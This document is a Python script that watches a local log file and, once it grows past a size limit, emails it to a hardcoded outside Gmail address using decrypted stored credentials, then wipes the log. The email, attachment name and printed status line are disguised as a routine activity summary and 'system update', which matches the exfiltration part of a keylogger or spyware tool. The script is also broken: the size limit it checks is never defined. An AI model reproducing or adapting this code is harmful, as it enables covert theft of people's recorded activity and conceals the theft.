import smtplib
import os
import time
import json
from email.message import EmailMessage
from cryptography.fernet import Fernet

# Load the encryption key
with open("secret.key", "rb") as key_file:
    key = key_file.read()

cipher = Fernet(key)

# Load and decrypt credentials
with open("credentials.enc", "rb") as enc_file:
    encrypted_data = enc_file.read()

credentials = json.loads(cipher.decrypt(encrypted_data).decode())

EMAIL_ADDRESS = credentials["email"]
EMAIL_PASSWORD = credentials["password"]
TO_EMAIL = "staceybanks10101@gmail.com"

LOG_FILE = "log.txt"
 

def send_email():
    """Send an email with the log file when file size exceeds limit."""
    if not os.path.exists(LOG_FILE):
        print("[ERROR] Log file not found!")
        return

    with open(LOG_FILE, "r") as file:
        log_data = file.read()
 
    if not log_data.strip():
        print("[INFO] Log file is empty. Skipping email.")
        return

    msg = EmailMessage()
    msg["Subject"] = "Daily Activity Summary"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg.set_content("Here is the latest activity summary from the system.")

    msg.add_attachment(log_data.encode("utf-8"), maintype="text", subtype="plain", filename="report_summary.txt")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            print("[INFO] Email sent successfully!")

        # Clear log file after sending
        with open(LOG_FILE, "w") as file:
            file.write("")
        print("[INFO] Log file cleared after sending.")

    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def monitor_log_size():
    """Continuously monitor log file size and send email when limit is reached."""
    while True:
        if os.path.exists(LOG_FILE):
            file_size = os.path.getsize(LOG_FILE)  # Get file size in bytes
            print(f"[INFO] Log file size: {file_size} bytes")

            if file_size >= FILE_SIZE_LIMIT:
                print("[INFO] Log size limit reached. Sending email...")
                send_email()
        
        time.sleep(5)  # Check every 5 seconds

if __name__ == "__main__":
    monitor_log_size()

print("System update script is running...")  
